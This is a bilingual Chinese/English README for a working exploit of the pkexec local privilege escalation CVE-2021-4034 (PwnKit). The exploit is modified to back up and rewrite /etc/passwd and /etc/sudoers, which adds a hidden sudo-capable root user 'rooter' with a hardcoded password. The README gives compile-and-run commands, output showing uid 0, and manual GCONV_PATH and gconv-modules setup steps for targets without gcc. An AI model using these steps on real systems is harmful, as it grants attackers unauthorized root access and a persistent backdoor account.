# CVE-2021-4034

CVE-2021-4034 Add Root User - Pkexec Local Privilege Escalation

根据[CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)进行了加强，执行Exploit将会默认添加用户名`rooter`，密码`Hello@World`，并且`rooter`用户将具有sudo权限。

Refer to [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034), executing Exploit will add username `rooter`, password `Hello@World` by default, and The `rooter` user will have sudo privileges.

## Usage

```bash

test@some:~$ gcc cve-2021-4034.c -o ./exp
test@some:~$ ./exp
/etc/passwd successfully backed up to /tmp/passwd.bak
File Open successed!

[+]Change sudoers priv.
/etc/sudoers successfully backed up to /tmp/sudoers.bak
File Open successed!

[+]Add Root User Success...
test@some:~$ su rooter
Password:
root@some:/home/test# id
uid=0(root) gid=0(root) groups=0(root)
root@some:/home/test#
```

### 手动提权

如果目标环境没有gcc，可手动执行命令，并在本地编译pwnkit.so。

#### 创建利用环境 - 目标机器
```bash
$ mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'
$ mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules
```

#### 编译pwnkit.so 与 pkexec - 本地

```bash
$ mkdir pwnkit
$ gcc pwnkit.so.c -o pwnkit/pwnkit.so -lcrypt -shared -fPIC
$ gcc pkexec.c -o pkexec
```

#### 执行Exploit

1. 将pwnkit文件夹上传到目标机器
2. 将pkexec上传到目标机器
3. 执行pkexec

```bash
$ ./pkexec
/etc/passwd successfully backed up to /tmp/passwd.bak
File Open successed!

[+]Change sudoers priv.
/etc/sudoers successfully backed up to /tmp/sudoers.bak
File Open successed!

[+]Add Root User Success...
```